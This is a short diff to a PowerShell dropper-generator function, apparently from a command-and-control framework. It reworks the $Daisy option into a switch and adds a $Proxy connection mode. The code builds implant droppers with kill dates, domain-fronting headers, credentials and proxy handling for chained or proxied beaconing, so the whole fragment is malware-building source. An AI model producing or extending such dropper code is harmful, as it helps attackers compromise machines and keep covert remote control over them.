@@ -1,10 +1,14 @@
 ﻿ #dropper
- function createdropper($killdate, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, $Daisy) {
+ function createdropper($killdate, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, [switch]$Daisy, [switch]$Proxy) {
 
-if ($Daisy) { 
+if ($Daisy.IsPresent) { 
     $connect="daisy"
     $server = "`$Server = `"$($ipv4address):$($serverport)`""
     $proxynone = "if (!`$proxyurl){`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+} elseif ($Proxy.IsPresent) { 
+    $proxynone = ""
+    $server = ""
+    $connect="proxy" 
 } else { 
     $proxynone = ""
     $server = ""
